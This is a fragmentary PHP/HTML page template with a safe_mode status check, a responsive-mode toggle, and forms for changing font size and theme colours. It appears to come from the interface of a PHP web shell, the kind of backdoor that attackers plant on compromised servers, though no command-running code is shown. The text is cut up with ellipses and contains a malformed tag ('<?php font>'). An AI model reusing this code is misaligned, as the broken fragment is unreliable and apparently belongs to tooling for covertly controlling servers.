...
<head>
	...
	<link rel="shortcut icon" href="<?php echo icons;?>">
	<?php
	if(isset($_SESSION['responsive'])){
...
body{background:<?php echo $bg;?>;color:<?php echo $col;?>;}
...
$sm= ini_get('safe_mode') ? "<font color=lime> ON<?php font>" : "<font color=grey> OFF</font>";
...
window.location.href='?responsive=off';
	...
	<tr><td>
	<form method="post">
 <input type="number" name="fz" value="<?php echo $fz;?>"><input type="submit" name="submitfz" value=">>"></form></td><td>
 <form method="post">
<input type="color" name="color" value="<?php echo $col;?>"><input type="submit" name="submitcol" value=">>"></form></td><td>
<form method="post">
<input type="color" name="pcolor" value="<?php echo $pcol;?>"><input type="submit" name="submitpc" value=">>"></form></td><td>
<form method="post">
<input type="color" name="bgcolor" value="<?php echo $bg;?>"><input type="text" value="<?php echo $bg;?>" name="bgcolor"><input type="submit" name="submitbg" value=">>"></form></td><td><?php echo $resmod;?></td></tr></tbody></table>
<h3>[<a href='?act=<?php echo $d;?>&reset=<?php echo$d;?>'>DEFAULT THEMES</a>]</h3>
</center>
<pre>
